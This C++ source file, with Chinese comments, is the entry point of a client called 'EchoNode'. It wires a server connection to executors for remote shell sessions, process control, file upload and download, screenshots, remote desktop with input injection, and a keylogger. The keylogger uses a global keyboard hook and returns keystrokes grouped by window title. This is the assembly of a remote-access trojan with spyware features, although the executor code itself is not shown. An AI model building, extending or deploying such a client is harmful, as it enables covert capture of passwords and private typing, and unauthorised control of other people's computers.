// EchoNode 客户端入口
#include "core/Client.hpp"
#include "core/Config.hpp"
#include "executor/Dispatcher.hpp"
#include "executor/FileExecutor.hpp"
#include "executor/ScreenshotExecutor.hpp"
#include "executor/RemoteDeskExecutor.hpp"
#include "executor/ShellExecutor.hpp"
#include "executor/ProcessExecutor.hpp"
#include "executor/ShellSessionManager.hpp"
#include "executor/KeylogExecutor.hpp"
#include "platform/PlatformFactory.hpp"
#include "protocol/to_server.hpp"

#include <iostream>
#include <memory>

namespace executor = echonode::executor;


#ifdef _WIN32
// 源码字符串为 UTF-8，控制台切到 65001 代码页避免中文乱码
#include <windows.h>
static void initConsoleUtf8() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
}
#else
static void initConsoleUtf8() {}
#endif

int main(int argc, char** argv) {
    initConsoleUtf8();
    auto cfg = echonode::core::Config::fromArgs(argc, argv);
    if (!cfg.valid) {
        std::cerr << "配置错误: " << cfg.error << "\n" << echonode::core::Config::usage() << "\n";
        return 1;
    }

    echonode::core::Client client(cfg);

    // 组装：shell_data 输出 → 推回服务端；shell_data 输入 → 写入会话 stdin
    executor::Dispatcher dispatcher;
    auto sessions =
        std::make_unique<echonode::executor::ShellSessionManager>(echonode::platform::createShellSpawn());
    auto* sessionsPtr = sessions.get();
    sessions->setSink([&client](const std::string& sessionId, const std::string& data, bool eof) {
        client.sendText(echonode::protocol::toJson(
                            echonode::protocol::ShellData{sessionId, data, eof})
                            .dump());
    });
    dispatcher.add(std::make_unique<echonode::executor::ShellExecutor>(
        echonode::platform::createShellSpawn(), *sessions));
    dispatcher.add(std::make_unique<echonode::executor::ProcessExecutor>(
        echonode::platform::createProcessOps()));

    // 文件传输：binary frame 经 FileExecutor 收发，结果由其自行延后应答
    auto fileExecutor = std::make_unique<echonode::executor::FileExecutor>();
    auto* filePtr = fileExecutor.get();
    fileExecutor->setBinarySender(
        [&client](const void* data, size_t len) { client.sendBinary(data, len); });
    fileExecutor->setResultSender(
        [&client](const echonode::protocol::TaskResult& result) {
            client.sendText(echonode::protocol::toJson(result).dump());
        });
    // 上传接收方角色：按 offset 落盘后回 file_ack 推进浏览器发送窗口
    fileExecutor->setTextSender(
        [&client](const std::string& text) { client.sendText(text); });
    dispatcher.add(std::move(fileExecutor));
    client.setBinaryHook([filePtr](const void* data, size_t len) {
        return filePtr->onBinary(data, len);
    });

    // 截图：复用 binary 通道（流类型 0x02），无显示环境时返回错误结果
    auto shotExecutor = std::make_unique<echonode::executor::ScreenshotExecutor>(
        echonode::platform::createScreenCapture());
    shotExecutor->setBinarySender(
        [&client](const void* data, size_t len) { client.sendBinary(data, len); });
    dispatcher.add(std::move(shotExecutor));

    // 远程桌面：JPEG 帧推送 + 输入注入
    auto deskExecutor = std::make_unique<echonode::executor::RemoteDeskExecutor>();
    deskExecutor->setBinarySender(
        [&client](const void* data, size_t len) { client.sendBinary(data, len); });
    deskExecutor->setResultSender(
        [&client](const echonode::protocol::TaskResult& result) {
            client.sendText(echonode::protocol::toJson(result).dump());
        });
    deskExecutor->setInputInjector(echonode::platform::createInputInjector());
    dispatcher.add(std::move(deskExecutor));

    // 键盘记录：WH_KEYBOARD_LL 钩子捕获全局键盘输入，按窗口标题上下文批量回传
    auto keylogExecutor = std::make_unique<echonode::executor::KeylogExecutor>();
    keylogExecutor->setResultSender(
        [&client](const echonode::protocol::TaskResult& result) {
            client.sendText(echonode::protocol::toJson(result).dump());
        });
    dispatcher.add(std::move(keylogExecutor));

    client.setTextHook([&sessionsPtr, filePtr](const nlohmann::json& j) {
        const std::string type = j.value("type", std::string{});
        // 下载发送方角色：接收方（浏览器）的累积确认推进滑动窗口
        if (type == "file_ack") {
            filePtr->onFileAck(j.value("taskId", std::string{}),
                               j.value("ackedOffset", size_t{0}));
            return true;
        }
        if (type == "shell_resize") {
            sessionsPtr->resize(j.value("sessionId", std::string{}),
                                j.value("cols", 80), j.value("rows", 24));
            return true;
        }
        if (type != "shell_data") return false;
        if (j.value("eof", false)) {
            sessionsPtr->close(j.value("sessionId", std::string{}));
            return true;
        }
        sessionsPtr->input(j.value("sessionId", std::string{}),
                           j.value("data", std::string{}));
        return true;
    });
    client.setTaskHandler([&dispatcher](echonode::protocol::Task task) {
        return dispatcher.dispatch(std::move(task));
    });

    client.run(); // 阻塞运行，Ctrl+C 退出
    return 0;
}
